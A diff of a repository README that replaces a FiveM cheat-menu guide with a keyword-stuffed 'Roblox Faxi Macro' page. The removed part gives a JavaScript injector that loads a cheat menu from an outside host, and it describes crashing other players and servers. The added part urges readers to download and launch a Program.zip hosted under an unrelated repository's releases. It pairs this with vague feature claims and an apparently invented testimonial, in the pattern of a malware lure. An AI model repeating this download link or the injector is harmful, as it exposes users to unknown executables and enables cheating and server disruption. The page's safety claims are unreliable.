@@ -1,30 +1,81 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+# 🚀 Welcome to Roblox Faxi Macro Repository! 🤖
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+![Roblox Faxi Macro](https://imgur.com/gallery/xxxxxxxx)
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+## Repository Name: Roblox-Faxi-Macro
+## Short Description: "Discover the best version of Faxi Macro with new features, adventures, and more! 🌟"
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+### Topics: 
+- roblox-faxi-ma 🎮
+- faxi-ma 🌌
+- faxi-macro-discord 🎧
+- faxi-macro-anime-adventures 🌠
+- faxi-macro-safe 🔒
+- faxi-macro-github 💻
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+---
+
+## 📎 Quick Links:
+- **[Download the Latest Version of Faxi Macro](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)**
+  - (Launch the downloaded file to enjoy the latest features! 💥)
+
+---
+
+## 🌟 Features:
+1. **Enhanced Faxi Macro:** Discover the most powerful and efficient version of Faxi Macro to optimize your Roblox experience.
+2. **New Adventures:** Explore the fascinating world of Faxi Macro Anime Adventures, where every quest leads to exciting discoveries.
+3. **Discord Integration:** Stay connected with the Faxi Macro Discord community to share tips, tricks, and stories.
+4. **Safety First:** Security is our top priority with Faxi Macro Safe features to protect your gaming environment.
+5. **GitHub Collaboration:** Dive into the world of Faxi Macro on GitHub to contribute, share insights, and collaborate with fellow enthusiasts.
+
+---
+
+## 🚀 Getting Started:
+1. **Download:** Click on the link above to download the latest version of Faxi Macro.
+2. **Installation:** Follow the on-screen instructions to install Faxi Macro on your device.
+3. **Explore:** Dive into the various features and adventures Faxi Macro has to offer.
+4. **Connect:** Join the Faxi Macro Discord server to connect with other users and share your experiences.
+5. **Contribute:** Explore the GitHub repository to contribute to the development of Faxi Macro and be a part of the community.
+
+---
+
+## 🌌 About Faxi Macro:
+Faxi Macro is a powerful tool designed to enhance the Roblox gaming experience by providing new features, adventures, and a safe environment for users. With a dedicated Discord community and GitHub collaboration, Faxi Macro ensures that users can enjoy the best version of Roblox with enhanced capabilities and security measures.
+
+---
+
+## 📢 Community Feedback:
+"Faxi Macro has completely transformed my Roblox experience! The new features and adventures keep me engaged for hours on end. I highly recommend it to all Roblox enthusiasts!" - RobloxGamer123 🎮
+
+---
+
+## 📚 Resources:
+- **[Faxi Macro User Guide](https://github.com/Roblox-Faxi-Macro/wiki/User-Guide)**
+- **[Faxi Macro GitHub Repository](https://github.com/Roblox-Faxi-Macro)**
+- **[Faxi Macro Discord Community](https://discord.gg/FaxiMacro)**
+
+---
+
+## 🎉 Join the Faxi Macro Revolution! 🎮💫
+
+Start your Faxi Macro journey today and experience Roblox like never before! 🚀🔥
+
+---
+
+## 🚨 For the latest updates and releases, check the "Releases" section of the GitHub repository. 🔗
+
+---
+
+## 🌟 Let's Connect:
+- **Follow us on Twitter:** [@FaxiMacroOfficial](https://twitter.com/FaxiMacroOfficial)
+- **Join our Discord Server:** [Faxi Macro Community](https://discord.gg/FaxiMacro)
+- **Explore our GitHub Repository:** [Faxi Macro GitHub](https://github.com/Roblox-Faxi-Macro)
+
+Thank you for being part of the Faxi Macro community! 🌟🚀
+
+---
+
+## 🚀 Happy Gaming with Faxi Macro! 🎮💥
+
+![Robot](https://imgur.com/gallery/xxxxxxxx)
